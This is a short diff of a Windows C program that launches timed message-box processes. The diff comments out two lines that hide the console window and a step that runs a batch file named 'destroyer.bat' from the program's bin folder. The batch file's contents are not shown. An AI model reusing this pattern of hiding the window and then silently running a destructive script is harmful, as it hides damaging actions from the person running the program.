@@ -42,8 +42,8 @@
 // }
 
 int main() {
-    HWND window = GetConsoleWindow();
-    ShowWindow(window, SW_HIDE);
+    // HWND window = GetConsoleWindow();
+    // ShowWindow(window, SW_HIDE);
 
     char currentDir[PATH_MAX];
     GetCurrentDirectoryA(PATH_MAX, currentDir);
@@ -138,10 +138,10 @@ int main() {
     createChildProcess(scndmessageBoxPath);
     totalSecs += 68;
     progClock(totalSecs);
-    char destroyerPath[PATH_MAX];
-    strcpy(destroyerPath, currentDir);
-    strcat(destroyerPath, "\\bin\\destroyer.bat");
-    system(destroyerPath);
+    // char destroyerPath[PATH_MAX];
+    // strcpy(destroyerPath, currentDir);
+    // strcat(destroyerPath, "\\bin\\destroyer.bat");
+    // system(destroyerPath);
 
     return 0;
 }
